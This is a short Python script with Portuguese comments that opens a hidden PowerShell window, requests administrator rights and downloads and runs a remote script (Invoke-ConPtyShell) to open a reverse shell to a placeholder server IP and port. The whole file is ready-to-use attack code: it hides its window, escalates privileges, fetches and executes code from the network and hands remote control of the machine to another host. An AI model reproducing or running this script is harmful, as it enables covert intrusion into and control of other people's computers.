import subprocess
IP = "IP DO SERVIDOR"
PORT = 1234 #Porta desejada (precisa estar aberta no servidor!)

def connectShell(IP, PORT):
    try:
        subprocess.Popen([
            "powershell.exe", "-noprofile", "-WindowStyle", "Hidden", "-c",
            fr"""
            Start-Process -Verb RunAs -Wait powershell.exe -Args "
            -noprofile -WindowStyle Hidden -c IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IP} {PORT}
            "
            """
        ])
        # -- Prosseguimento ao código --

    except ConnectionRefusedError:
        print("Erro ao conectar ao servidor.")


connectShell(IP, PORT)
